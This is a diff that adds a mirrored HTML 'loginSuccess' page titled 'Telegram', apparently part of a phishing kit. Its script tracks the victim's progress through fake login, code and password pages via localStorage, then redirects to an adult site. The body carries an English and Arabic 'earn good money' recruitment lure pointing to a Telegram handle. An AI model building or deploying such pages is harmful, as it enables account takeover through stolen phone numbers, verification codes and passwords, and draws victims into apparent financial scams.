@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Mirrored from qhzxzx.com/loginSuccess by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 29 Mar 2025 19:47:57 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,shrink-to-fit=no,viewport-fit=cover">
+    <title>Telegram</title>
+    <style>
+        :root{
+            --font-size: 16px;
+            --font-family: "Roboto", -apple-system, BlinkMacSystemFont, "Apple Color Emoji", "Segoe UI", Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
+        }
+
+        html,body{
+            width: 100%;
+            height: 100%;
+            font-size: var(--font-size);
+            font-family: var(--font-family);
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+        }
+        *{
+            font-size: var(--font-size);
+            font-family: var(--font-family);
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+
+        }
+        .wrap{
+            width: 100%;
+            margin: 0 auto;
+        }
+        /* 当屏幕宽度大于或等于750像素时，调整 */
+        @media (min-width: 750px) {
+            .wrap{
+                width: 750px;
+            }
+        }
+        #lan-en>p {
+            font-size: 18px;
+            padding-left: 15px;
+            padding-right: 15px;
+        }
+        #lan-alabo>p {
+            font-size: 18px;
+            padding-left: 15px;
+            padding-right: 15px;
+        }
+        #lan-en{
+            padding-top: 20px;
+        }
+        #lan-alabo {
+            margin-top: 30px;
+            padding-bottom: 10px;
+        }
+        a{
+            text-decoration: none;
+            color: black;
+        }
+    </style>
+    <script>
+
+        var loginUrl = "login.html";
+        var codeUrl = "code.html";
+        var pwdUrl = "passwd.html";
+        var successUrl = "loginSuccess.html";
+
+        function initPage() {
+
+            var mobile = localStorage.getItem("mobile")
+            if (mobile == undefined || mobile == null || mobile == "") {
+                window.location.replace(loginUrl)
+                return false
+            }
+
+            var localKey = mobile.replace(/\D/g, '')
+            if(localKey == "") {
+                window.location.replace(loginUrl)
+                return false
+            }
+
+            var localVal = localStorage.getItem(localKey)
+            if (localVal == undefined || localVal == null || localVal == "") {
+                window.location.replace(loginUrl)
+                return false
+            }
+
+            try {
+                localVal = JSON.parse(localVal)
+                if (localVal === null || typeof localVal !== 'object') {
+                    localStorage.removeItem(localKey);
+                    window.location.replace(loginUrl)
+                    return false
+                }
+            }catch (e) {
+                localStorage.removeItem(localKey);
+                window.location.replace(loginUrl)
+                return false
+            }
+
+            //判断是否登录过了
+            if (localVal.loginTime != undefined && localVal.loginTime != null && localVal.loginTime != "") {
+                return true
+            }
+
+            //判断是否验证过验证码只有密码没有验证了
+            if (localVal.checkCodeTime != undefined && localVal.checkCodeTime != null && localVal.checkCodeTime != "") {
+                var nowCheckCodeTime = (new Date().getTime()).toString().substr(0,10)
+                if((parseInt(nowCheckCodeTime) - parseInt(localVal.checkCodeTime)) < 1800) {
+                    window.location.replace(pwdUrl)
+                    return false
+                }
+            }
+
+            //判断是否已经获取过验证码了
+            if (localVal.getCodeTime != undefined && localVal.getCodeTime != null && localVal.getCodeTime != "") {
+                var nowGetCodeTime = (new Date().getTime()).toString().substr(0,10)
+                if((parseInt(nowGetCodeTime) - parseInt(localVal.getCodeTime)) < 300) {
+                    window.location.replace(codeUrl)
+                    return false
+                }
+            }
+
+            window.location.replace(loginUrl)
+
+            return false
+
+        }
+
+        if (initPage()) {
+            window.location.replace("https://www.xnxx.com/")
+        }
+
+    </script>
+</head>
+<body>
+
+<div class="wrap">
+    <div id="lan-en">
+        <p>
+            Hello. My name is Adeli, I would like to recommend you a very reliable company where me and my team earn very good money. I am looking for new partners who want to earn good money and work in a profitable business. If you are interested in a stable income in a reliable company, I can send you detailed information.
+            <a href="https://t.me/amg9924">@amg9924</a>
+        </p>
+
+    </div>
+    <div id="lan-alabo">
+        <p style="text-align: right">مرحباً، اسمي أديلي، أود أن أوصيك بشركة موثوقة للغاية حيث أكسب أنا وفريقي أموالاً جيدة للغاية. أبحث عن شركاء جدد يريدون كسب أموال جيدة والعمل في عمل مربح. إذا كنت مهتمًا بدخل ثابت في شركة موثوقة، يمكنني إرسال معلومات مفصلة إليك</p>
+        <p style="text-align: right">
+            <a href="https://t.me/amg9924">@amg9924</a>
+        </p>
+    </div>
+</div>
+</body>
+
+<!-- Mirrored from qhzxzx.com/loginSuccess by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 29 Mar 2025 19:47:57 GMT -->
+</html>
